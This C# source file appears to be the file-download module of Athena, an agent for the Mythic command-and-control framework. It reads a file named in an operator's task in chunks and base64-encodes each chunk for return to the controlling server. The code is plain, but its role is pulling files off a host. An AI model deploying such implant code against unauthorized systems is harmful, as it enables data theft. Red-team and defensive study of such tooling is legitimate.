using Athena.Models.Mythic.Tasks;
using Athena.Models;
using Athena.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;
using Athena.Models.Responses;

namespace Athena.Handler.Common.FileSystem
{
    public class DownloadHandler
    {
        private ConcurrentDictionary<string, MythicDownloadJob> downloadJobs { get; set; }
        public DownloadHandler()
        {
            downloadJobs = new ConcurrentDictionary<string, MythicDownloadJob>();
        }
        /// <summary>
        /// Create and start a new download job
        /// </summary>
        /// <param name="job">MythicJob containing the job task</param>
        public async Task<string> StartDownloadJob(MythicJob job)
        {
            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
            Dictionary<string, string> par = Misc.ConvertJsonStringToDict(job.task.parameters);
            downloadJob.path = par["file"].Replace("\"", string.Empty);
            downloadJob.total_chunks = await GetTotalChunks(downloadJob);
            downloadJobs.GetOrAdd(job.task.id, downloadJob);
            Debug.WriteLine($"[{DateTime.Now}] Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
            if (downloadJob.total_chunks == 0)
            {
                downloadJobs.Remove(job.task.id, out _);

                return new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", "0x16" } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson();
            }

            return new DownloadResponse
            {
                download = new DownloadResponseData()
                {
                    total_chunks = downloadJob.total_chunks,
                    full_path = downloadJob.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = "",
                },
                user_output = string.Empty,
                task_id = job.task.id,
                completed = false,
                status = string.Empty,
                file_id = null
            }.ToJson();
        }
        /// <summary>
        /// Check to see if a download job has started
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public async Task<bool> ContainsJob(string task_id)
        {
            return downloadJobs.ContainsKey(task_id);
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public async Task<MythicDownloadJob> GetDownloadJob(string task_id)
        {
            return downloadJobs[task_id];
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public async Task<string> DownloadNextChunk(MythicDownloadJob job)
        {
            try
            {
                FileStream fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    return Misc.Base64Encode(await File.ReadAllBytesAsync(job.path));
                }
                byte[] buffer = new byte[job.chunk_size];

                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                using (fileStream)
                {
                    FileInfo fileInfo = new FileInfo(job.path);

                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
                    {
                        job.complete = true;
                        buffer = new byte[fileInfo.Length - job.bytesRead];
                    }

                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);

                    return Misc.Base64Encode(buffer);
                }
            }
            catch (Exception e)
            {
                job.complete = true;
                return e.Message;
            }
        }

        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(MythicDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return total_chunks;
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public async Task CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);
        }
    }
}
